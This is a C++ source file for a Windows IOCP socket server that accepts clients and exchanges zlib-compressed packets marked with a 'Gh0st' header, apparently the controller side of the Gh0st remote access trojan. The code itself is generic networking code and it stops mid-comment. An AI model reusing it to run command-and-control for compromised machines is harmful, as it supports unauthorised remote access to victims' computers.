// IOCPServer.cpp: implementation of the CIOCPServer class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "IOCPServer.h"
#include "../MainFrm.h"

#include "zlib/zlib.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5
#define HUERISTIC_VALUE 2
CRITICAL_SECTION CIOCPServer::m_cs;


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	C'tor initializes Winsock2 and miscelleanous events etc.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::CIOCPServer()
{
	TRACE("CIOCPServer=%p\n",this);	

	// 
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	InitializeCriticalSection(&m_cs);

	m_hThread		= NULL;
	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);
	m_socListen		= NULL;

	m_bTimeToKill		= false;
	m_bDisconnectAll	= false;

	m_hEvent		= NULL;
	m_hCompletionPort= NULL;

	m_bInit = false;
	m_nCurrentThreads	= 0;
	m_nBusyThreads		= 0;

	m_nSendKbps = 0;
	m_nRecvKbps = 0;

	m_nMaxConnections = 10000;
	m_nKeepLiveTime = 1000 * 60 * 3; // 三分钟探测一次
	// Packet Flag;
	BYTE bPacketFlag[] = {'G', 'h', '0', 's', 't'};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CIOCPServer
// 
// DESCRIPTION:	Tidy up
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CIOCPServer::~CIOCPServer()
{
	try
	{
		Shutdown();
		WSACleanup();
	}catch(...){}
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	Init
// 
// DESCRIPTION:	Starts listener into motion
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;
	m_pFrame		=  pFrame;
	m_nMaxConnections = nMaxConnections;
	m_socListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);


	if (m_socListen == INVALID_SOCKET)
	{
		TRACE(_T("Could not create listen socket %ld\n"),WSAGetLastError());
		return false;
	}

	// Event for handling Network IO
	m_hEvent = WSACreateEvent();

	if (m_hEvent == WSA_INVALID_EVENT)
	{
		TRACE(_T("WSACreateEvent() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	// The listener is ONLY interested in FD_ACCEPT
	// That is when a client connects to or IP/Port
	// Request async notification
	int nRet = WSAEventSelect(m_socListen,
						  m_hEvent,
						  FD_ACCEPT);

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("WSAAsyncSelect() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	SOCKADDR_IN		saServer;		


	// Listen on our designated Port#
	saServer.sin_port = htons(nPort);

	// Fill in the rest of the address structure
	saServer.sin_family = AF_INET;
	saServer.sin_addr.s_addr = INADDR_ANY;

	// bind our name to the socket
	nRet = bind(m_socListen, 
				(LPSOCKADDR)&saServer, 
				sizeof(struct sockaddr));

	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("bind() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}

	// Set the socket to listen
	nRet = listen(m_socListen, SOMAXCONN);
	if (nRet == SOCKET_ERROR)
	{
		TRACE(_T("listen() error %ld\n"),WSAGetLastError());
		closesocket(m_socListen);
		return false;
	}


	////////////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////
	UINT	dwThreadId = 0;

	m_hThread =
			(HANDLE)_beginthreadex(NULL,				// Security
									 0,					// Stack size - use default
									 ListenThreadProc,  // Thread fn entry point
									 (void*) this,	    
									 0,					// Init flag
									 &dwThreadId);	// Thread address

	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();
		m_bInit = true;
		return true;
	}

	return false;
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ListenThreadProc
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)
{
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(lParam);

	WSANETWORKEVENTS events;
	
	while(1)
	{
		//
		// Wait for something to happen
		//
        if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
            break;

		DWORD dwRet;
		dwRet = WSAWaitForMultipleEvents(1,
									 &pThis->m_hEvent,
									 FALSE,
									 100,
									 FALSE);

		if (dwRet == WSA_WAIT_TIMEOUT)
			continue;

		//
		// Figure out what happened
		//
		int nRet = WSAEnumNetworkEvents(pThis->m_socListen,
								 pThis->m_hEvent,
								 &events);
		
		if (nRet == SOCKET_ERROR)
		{
			TRACE(_T("WSAEnumNetworkEvents error %ld\n"),WSAGetLastError());
			break;
		}

		// Handle Network events //
		// ACCEPT
		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
				pThis->OnAccept();
			else
			{
				TRACE(_T("Unknown network event error %ld\n"),WSAGetLastError());
				break;
			}

		}

	} // while....

	return 0; // Normal Thread Exit Code...
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnAccept
// 
// DESCRIPTION:	Listens for incoming clients
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09072001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::OnAccept()
{

	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;
	
	int			nRet;
	int			nLen;

	if (m_bTimeToKill || m_bDisconnectAll)
		return;

	//
	// accept the new socket descriptor
	//
	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_socListen,
					    (LPSOCKADDR)&SockAddr,
						&nLen); 

	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			//
			// Just log the error and return
			//
			TRACE(_T("accept() error\n"),WSAGetLastError());
			return;
		}
	}

	// Create the Client context to be associted with the completion port
	ClientContext* pContext = AllocateContext();
	// AllocateContext fail
	if (pContext == NULL)
		return;

    pContext->m_Socket = clientSocket;

	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);

   // Associate the new socket with a completion port.
	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD) pContext))
    {
        delete pContext;
		pContext = NULL;

        closesocket( clientSocket );
        closesocket( m_socListen );
        return;
    }

	// 关闭nagle算法,以免影响性能，因为控制时控制端要发送很多数据量很小的数据包,要求马上发送
	// 暂不关闭，实验得知能网络整体性能有很大影响
	const char chOpt = 1;

// 	int nErr = setsockopt(pContext->m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
// 	if (nErr == -1)
// 	{
// 		TRACE(_T("setsockopt() error\n"),WSAGetLastError());
// 		return;
// 	}

	// Set KeepAlive 开启保活机制
	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) != 0)
	{
		TRACE(_T("setsockopt() error\n"), WSAGetLastError());
	}

	// 设置超时详细信息
	tcp_keepalive	klive;
	klive.onoff = 1; // 启用保活
	klive.keepalivetime = m_nKeepLiveTime;
	klive.keepaliveinterval = 1000 * 10; // 重试间隔为10秒 Resend if No-Reply
	WSAIoctl
		(
		pContext->m_Socket, 
		SIO_KEEPALIVE_VALS,
		&klive,
		sizeof(tcp_keepalive),
		NULL,
		0,
		(unsigned long *)&chOpt,
		0,
		NULL
		);

	CLock cs(m_cs, "OnAccept" );
	// Hold a reference to the context
	m_listContexts.AddTail(pContext);


	// Trigger first IO Completion Request
	// Otherwise the Worker thread will remain blocked waiting for GetQueuedCompletionStatus...
	// The first message that gets queued up is ClientIoInitializing - see ThreadPoolFunc and 
	// IO_MESSAGE_HANDLER


	OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);

	BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);
	
	if ( (!bSuccess && GetLastError( ) != ERROR_IO_PENDING))
	{            
        RemoveStaleClient(pContext,TRUE);
	    return;
    }

	m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_CLIENT_CONNECT);

	// Post to WSARecv Next
	PostRecv(pContext);
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::InitializeIOCP
// 
// DESCRIPTION:	Create a dummy socket and associate a completion port with it.
//				once completion port is create we can dicard the socket
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::InitializeIOCP(void)
{

    SOCKET s;
    DWORD i;
    UINT  nThreadID;
    SYSTEM_INFO systemInfo;

    //
    // First open a temporary socket that we will use to create the
    // completion port.  In NT 3.51 it will not be necessary to specify
    // the FileHandle parameter of CreateIoCompletionPort()--it will
    // be legal to specify FileHandle as NULL.  However, for NT 3.5
    // we need an overlapped file handle.
    //

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if ( s == INVALID_SOCKET ) 
        return false;

    // Create the completion port that will be used by all the worker
    // threads.
    m_hCompletionPort = CreateIoCompletionPort( (HANDLE)s, NULL, 0, 0 );
    if ( m_hCompletionPort == NULL ) 
	{
        closesocket( s );
        return false;
    }

    // Close the socket, we don't need it any longer.
    closesocket( s );

    // Determine how many processors are on the system.
    GetSystemInfo( &systemInfo );

	m_nThreadPoolMin  = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;
	m_nThreadPoolMax  = m_nThreadPoolMin;
	m_nCPULoThreshold = 10; 
	m_nCPUHiThreshold = 75; 

	m_cpu.Init();


    // We use two worker threads for eachprocessor on the system--this is choosen as a good balance
    // that ensures that there are a sufficient number of threads available to get useful work done 
	// but not too many that context switches consume significant overhead.
	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;

	// We need to save the Handles for Later Termination...
	HANDLE hWorker;
	m_nWorkerCnt = 0;

    for ( i = 0; i < nWorkerCnt; i++ ) 
	{
		hWorker = (HANDLE)_beginthreadex(NULL,					// Security
										0,						// Stack size - use default
										ThreadPoolFunc,     		// Thread fn entry point
										(void*) this,			// Param for thread
										0,						// Init flag
										&nThreadID);			// Thread address


        if (hWorker == NULL ) 
		{
            CloseHandle( m_hCompletionPort );
            return false;
        }

		m_nWorkerCnt++;

		CloseHandle(hWorker);
    }

	return true;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::ThreadPoolFunc 
// 
// DESCRIPTION:	This is the main worker routine for the worker threads.  
//				Worker threads wait on a completion port for I/O to complete.  
//				When it completes, the worker thread processes the I/O, then either pends 
//				new I/O or closes the client's connection.  When the service shuts 
//				down, other code closes the completion port which causes 
//				GetQueuedCompletionStatus() to wake up and the worker thread then 
//				exits.
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001              Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{
	// Get back our pointer to the class
	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = reinterpret_cast<CIOCPServer*>(thisContext);
	ASSERT(pThis);

    HANDLE hCompletionPort = pThis->m_hCompletionPort;
    
    DWORD dwIoSize;
    LPOVERLAPPED lpOverlapped;
    ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	bool			bEnterRead;

	InterlockedIncrement(&pThis->m_nCurrentThreads);
	InterlockedIncrement(&pThis->m_nBusyThreads);

	//
    // Loop round and round servicing I/O completions.
	// 

	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false; ) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= false;
		bEnterRead		= false;
		// Thread is Block waiting for IO completion
		InterlockedDecrement(&pThis->m_nBusyThreads);


		// Get a completed IO request.
		BOOL bIORet = GetQueuedCompletionStatus(
               hCompletionPort,
               &dwIoSize,
               (LPDWORD) &lpClientContext,
               &lpOverlapped, INFINITE);

		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);


		int nBusyThreads = InterlockedIncrement(&pThis->m_nBusyThreads);

        if (!bIORet && dwIOError != WAIT_TIMEOUT )
		{
			if (lpClientContext && pThis->m_bTimeToKill == false)
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE);
			}
			continue;

			// anyway, this was an error and we should exit
			bError = true;
		}
		
		if (!bError) 
		{
			
			// Allocate another thread to the thread Pool?
			if (nBusyThreads == pThis->m_nCurrentThreads)
			{
				if (nBusyThreads < pThis->m_nThreadPoolMax)
				{
					if (pThis->m_cpu.GetUsage() > pThis->m_nCPUHiThreshold)
					{
						UINT nThreadID = -1;

//						HANDLE hThread = (HANDLE)_beginthreadex(NULL,				// Security
//											 0,					// Stack size - use default
//											 ThreadPoolFunc,  // Thread fn entry point
///											 (void*) pThis,	    
//											 0,					// Init flag
//											 &nThreadID);	// Thread address

//						CloseHandle(hThread);
					}
				}
			}


			// Thread timed out - IDLE?
			if (!bIORet && dwIOError == WAIT_TIMEOUT)
			{
				if (lpClientContext == NULL)
				{
					if (pThis->m_cpu.GetUsage() < pThis->m_nCPULoThreshold)
					{
						// Thread has no outstanding IO - Server hasn't much to do so die
						if (pThis->m_nCurrentThreads > pThis->m_nThreadPoolMin)
							bStayInPool =  FALSE;
					}

					bError = true;
				}
			}
		}
//////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////
		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				try
				{
					pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);
				}
				catch (...) {}
			}
		}

		if(pOverlapPlus)
			delete pOverlapPlus; // from previous call
    }

	InterlockedDecrement(&pThis->m_nWorkerCnt);

	InterlockedDecrement(&pThis->m_nCurrentThreads);
	InterlockedDecrement(&pThis->m_nBusyThreads);
   	return 0;
} 

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Stop
// 
// DESCRIPTION:	Signal the listener to quit his thread
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Stop()
{
    ::SetEvent(m_hKillEvent);
    WaitForSingleObject(m_hThread, INFINITE);
	CloseHandle(m_hThread);
    CloseHandle(m_hKillEvent);
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::GetHostName
// 
// DESCRIPTION:	Get the host name of the connect client
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
CString CIOCPServer::GetHostName(SOCKET socket)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));

	int nSockAddrLen = sizeof(sockAddr);
	
	BOOL bResult = getpeername(socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	return bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
}


void CIOCPServer::PostRecv(ClientContext* pContext)
{
	// issue a read request 
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);
	ULONG			ulFlags = MSG_PARTIAL;
	DWORD			dwNumberOfBytesRecvd;
	UINT nRetVal = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);
	
	if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		RemoveStaleClient(pContext, FALSE);
	}
}
////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::Send
// 
// DESCRIPTION:	Posts a Write + Data to IO CompletionPort for transfer
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund			 09062001			   Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
{
	if (pContext == NULL)
		return;

	try
	{
		if (nSize > 0)
		{
			// Compress data
			unsigned long	destLen = (double)nSize * 1.001  + 12;
			LPBYTE			pDest = new BYTE[destLen];
			int	nRet = compress(pDest, &destLen, lpData, nSize);
			
			if (nRet != Z_OK)
			{
				delete [] pDest;
				return;
			}

			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + HDR_SIZE;
			// 5 bytes packet flag
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			// 4 byte header [Size of Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
			// 4 byte header [Size of UnCompress Entire Packet]
			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
			// Write Data
			pContext->m_WriteBuffer.Write(pDest, destLen);
			delete [] pDest;
			
			// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
			delete [] lpResendWriteBuffer;
		}
		else // 要求重发
		{
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
		}
		// Wait for Data Ready signal to become available
		WaitForSingleObject(pContext->m_hWriteComplete, INFINITE);

		// Prepare Packet
	 //	pContext->m_wsaOutBuffer.buf = (CHAR*) new BYTE[nSize];
	 //	pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();

 		OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
 		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);

		pContext->m_nMsgOut++;
	}catch(...){}
}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CClientListener::OnClientInitializing
// 
// DESCRIPTION:	Called when client is initailizing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	// We are not actually doing anything here, but we could for instance make
	// a call to Send() to send a greeting message or something

	return true;		// make sure to issue a read after this
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientReading
// 
// DESCRIPTION:	Called when client is reading 
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
	CLock cs(CIOCPServer::m_cs, "OnClientReading");
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;
		
		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
			nBytes = 0;
		}

		//////////////////////////////////////////////////////////////////////////

		if (dwIoSize == 0)
		{
			RemoveStaleClient(pContext, FALSE);
			return false;
		}

		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送
			Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
			// 必须再投递一个接收请求
			PostRecv(pContext);
			return true;
		}

		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);
			
		m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE);


		// Check real Data
		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad buffer";

			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			
			// Update Process Variable
			pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));

				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";

				pContext->m_CompressionBuffer.Read(pData, nCompressLength);

				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
				}
				else
				{
					throw "bad buffer";
				}

				delete [] pData;
				delete [] pDeCompressionData;
				pContext->m_nMsgIn++;
			}
			else
				break;
		}
		// Post to WSARecv Next
		PostRecv(pContext);
	}catch(...)
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		// 要求重发，就发送0, 内核自动添加数包标志
		Send(pContext, NULL, 0);
		PostRecv(pContext);
	}

	return true;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientWriting
// 
// DESCRIPTION:	Called when client is writing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)
{
	try
	{
		//////////////////////////////////////////////////////////////////////////
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		
		nBytes += dwIoSize;
		
		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nSendKbps), nBytes);
			nBytes = 0;
		}
		//////////////////////////////////////////////////////////////////////////

		ULONG ulFlags = MSG_PARTIAL;

		// Finished writing - tidy up
		pContext->m_WriteBuffer.Delete(dwIoSize);
		if (pContext->m_WriteBuffer.GetBufferLen() == 0)
		{
			pContext->m_WriteBuffer.ClearBuffer();
			// Write complete
			SetEvent(pContext->m_hWriteComplete);
			return true;			// issue new read after this one
		}
		else
		{
			OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);

			m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_TRANSMIT);


			pContext->m_wsaOutBuffer.buf = (char*) pContext->m_WriteBuffer.GetBuffer();
			pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();

			int nRetVal = WSASend(pContext->m_Socket, 
							&pContext->m_wsaOutBuffer,
							1,
							&pContext->m_wsaOutBuffer.len, 
							ulFlags,
							&pOverlap->m_ol, 
							NULL);


			if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING )
			{
				RemoveStaleClient( pContext, FALSE );
			}

		}
	}catch(...){}
	return false;			// issue new read after this one
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CloseCompletionPort
// 
// DESCRIPTION:	Close down the IO Complete Port, queue and associated client context structs
//				which in turn will close the sockets...
//				
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::CloseCompletionPort()
{

	while (m_nWorkerCnt)
	{
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) NULL, NULL);
		Sleep(100);
	}

	// Close the CompletionPort and stop any more requests
	CloseHandle(m_hCompletionPort);

	ClientContext* pContext = NULL;

	do 
	{
		POSITION pos  = m_listContexts.GetHeadPosition();
		if (pos)
		{
			pContext = m_listContexts.GetNext(pos);			
			RemoveStaleClient(pContext, FALSE);
		}
	}
	while (!m_listContexts.IsEmpty());

	m_listContexts.RemoveAll();

}


BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE) socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::RemoveStaleClient
// 
// DESCRIPTION:	Client has died on us, close socket and remove context from our list
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
{
    CLock cs(m_cs, "RemoveStaleClient");

	TRACE("CIOCPServer::RemoveStaleClient\n");

    LINGER lingerStruct;


    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //

    if ( !bGraceful ) 
	{

        lingerStruct.l_onoff = 1;
        lingerStruct.l_linger = 0;
        setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
                    (char *)&lingerStruct, sizeof(lingerStruct) );
    }



    //
    // Free context structures
	if (m_listContexts.Find(pContext)) 
	{

		//
		// Now close the socket handle.  This will do an abortive or  graceful close, as requested.  
		CancelIo((HANDLE) pContext->m_Socket);

		closesocket( pContext->m_Socket );
		pContext->m_Socket = INVALID_SOCKET;

        while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext)) 
                Sleep(0);

		m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_CLIENT_DISCONNECT);

		MoveToFreePool(pContext);

	}
}


void CIOCPServer::Shutdown()
{
	if (m_bInit == false)
		return;

	m_bInit = false;
	m_bTimeToKill = true;

	// Stop the listener
	Stop();


	closesocket(m_socListen);	
	WSACloseEvent(m_hEvent);


	CloseCompletionPort();
	
	DeleteCriticalSection(&m_cs);

 	while (!m_listFreePool.IsEmpty())
 		delete m_listFreePool.RemoveTail();

}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Checks free pool otherwise allocates a context
// 
// INPUTS:		
// 
// NOTES:	
// 
